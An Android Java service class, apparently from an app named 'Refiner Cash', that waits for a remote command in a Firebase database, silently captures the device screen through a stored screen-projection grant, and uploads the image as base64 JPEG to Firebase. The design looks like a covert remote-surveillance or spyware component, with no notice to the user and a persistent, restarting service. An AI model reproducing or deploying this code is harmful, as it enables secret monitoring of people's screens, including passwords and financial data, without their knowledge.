package com.my.Refiner.Cash.User;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

public class ScreenCaptureService extends Service {

    private static final String TAG = "ScreenCaptureService";

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int width, height, dpi;
    private String deviceId;
    private DatabaseReference dbRef;
    private ValueEventListener commandListener;

    public static MediaProjection sMediaProjection;
    public static int sResultCode;
    public static Intent sResultData;

    @Override
    public void onCreate() {
        super.onCreate();
        dbRef = FirebaseDatabase.getInstance().getReference();
        deviceId = getSharedPreferences("mdm", MODE_PRIVATE)
                .getString("device_id", "unknown");

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (wm != null) wm.getDefaultDisplay().getMetrics(metrics);
        width = metrics.widthPixels;
        height = metrics.heightPixels;
        dpi = metrics.densityDpi;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (sMediaProjection == null && sResultData != null) {
            MediaProjectionManager mpm = (MediaProjectionManager)
                    getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                sMediaProjection = mpm.getMediaProjection(sResultCode, sResultData);
            }
        }

        listenForScreenshotCommand();
        return START_STICKY;
    }

    private void listenForScreenshotCommand() {
        if (commandListener != null) return;

        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                Boolean take = snapshot.getValue(Boolean.class);
                if (take != null && take) {
                    captureScreen();
                    dbRef.child("devices").child(deviceId)
                            .child("screenshotCommand").setValue(false);
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Firebase error: " + error.getMessage());
            }
        };

        dbRef.child("devices").child(deviceId).child("screenshotCommand")
                .addValueEventListener(commandListener);
    }

    private void captureScreen() {
        if (sMediaProjection == null) {
            Log.w(TAG, "No MediaProjection permission");
            return;
        }

        try {
            if (imageReader != null) {
                imageReader.close();
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                imageReader = ImageReader.newInstance(width, height,
                        PixelFormat.RGBA_8888, 2);
            } else {
                imageReader = ImageReader.newInstance(width, height,
                        PixelFormat.RGBA_8888, 2);
            }

            virtualDisplay = sMediaProjection.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image == null) return;

                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    Bitmap bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                    byte[] bytes = baos.toByteArray();
                    String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);

                    Map<String, Object> shot = new HashMap<>();
                    shot.put("data", base64);
                    shot.put("time", System.currentTimeMillis());

                    dbRef.child("devices").child(deviceId)
                            .child("screenshot").setValue(shot)
                            .addOnSuccessListener(aVoid -> Log.d(TAG, "Screenshot sent"));

                    image.close();
                    bitmap.recycle();

                    if (virtualDisplay != null) {
                        virtualDisplay.release();
                        virtualDisplay = null;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Capture error: " + e.getMessage());
                }
            }, 1000);
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (commandListener != null) {
            dbRef.child("devices").child(deviceId).child("screenshotCommand")
                    .removeEventListener(commandListener);
        }
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
